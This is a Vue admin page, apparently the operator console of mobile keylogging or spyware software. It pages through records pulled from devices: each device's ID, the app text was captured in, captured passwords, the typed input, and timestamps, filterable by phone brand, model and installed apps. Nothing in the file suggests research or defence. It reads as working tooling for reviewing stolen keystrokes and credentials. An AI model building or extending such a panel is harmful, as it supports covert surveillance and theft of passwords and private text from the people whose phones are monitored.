<template>
  <div class="mod-sys__log-operation">
    <el-form :inline="true" :model="dataForm" @keyup.enter="getDataList()">
      <el-form-item>
        <el-input v-model="dataForm.deviceId" placeholder="设备ID" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-input v-model="dataForm.brand" placeholder="品牌" clearable></el-input>
      </el-form-item>

      <el-form-item>
        <el-input v-model="dataForm.model" placeholder="手机型号" clearable></el-input>
      </el-form-item>
      <el-form-item>
        <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
        </el-select>
      </el-form-item>


      <el-form-item>
        <el-button @click="getDataList()">{{ $t("query") }}</el-button>
      </el-form-item>
    </el-form>
    <el-table v-loading="dataListLoading" :data="dataList" border  @sort-change="dataListSortChangeHandle" style="width: 100%">
      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" ></el-table-column>
      <el-table-column prop="pkg" label="所属包" header-align="center" align="center"  show-overflow-tooltip></el-table-column>
      <el-table-column prop="appPkg" label="日志APP" header-align="center" align="center"  show-overflow-tooltip></el-table-column>
      <el-table-column prop="password" label="密码" header-align="center" align="center"  show-overflow-tooltip></el-table-column>
      <el-table-column prop="text" label="输入内容" header-align="center" align="center"  :show-overflow-tooltip="true"></el-table-column>
      <el-table-column label="时间" header-align="center" align="center" >

        <template v-slot="scope">
           {{ formatTime(scope.row.time) }}
        </template>
      </el-table-column>

    </el-table>
    <el-pagination
      :current-page="page"
      :page-sizes="[10, 20, 50, 100]"
      :page-size="limit"
      :total="total"
      layout="total, sizes, prev, pager, next, jumper"
      @size-change="pageSizeChangeHandle"
      @current-change="pageCurrentChangeHandle"
    >
    </el-pagination>

  </div>
</template>

<script lang="ts">
import useView from "@/hooks/useView";
import baseService from "@/service/baseService";
import { defineComponent, reactive, toRefs, ref } from "vue";
import { ElNotification, ElMessageBox, ElMessage } from "element-plus";
export default defineComponent({
  components: {
  },
  setup() {
    const state = reactive({
      post: true,
      getDataListURL: "/inputTextRecord/page",
      getDataListIsPage: true,
      installAppFilter: [],
      dataForm: {
        deviceId: "",
        model: "",
        brand: "",
        installApp: ""
      }
    });
    const deviceId = ref("");

    return { ...useView(state), ...toRefs(state), deviceId };
  },
  async mounted() {
    await this.fetchInstallAppFilterList();
  },
  methods: {
    async fetchInstallAppFilterList() {
      let { code, data, msg } = await baseService.post("/device/installAppFilterList");
      if (code == 0) {
        this.installAppFilter = data;
      } else {
        ElMessageBox.alert(msg, "错误", {
          type: "error",
          confirmButtonText: "OK"
        });
      }
    },
    formatTime(timestamp: any) {
      if (!timestamp) return '';

      // 确保转换为数字
      const timeNum = Number(timestamp);
      if (isNaN(timeNum)) return '';

      const date = new Date(timeNum);

      // 检查日期是否有效
      if (isNaN(date.getTime())) return '';

      const year = date.getFullYear();
      const month = String(date.getMonth() + 1).padStart(2, '0');
      const day = String(date.getDate()).padStart(2, '0');
      const hours = String(date.getHours()).padStart(2, '0');
      const minutes = String(date.getMinutes()).padStart(2, '0');
      const seconds = String(date.getSeconds()).padStart(2, '0');

      return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
    }
  }
});
</script>
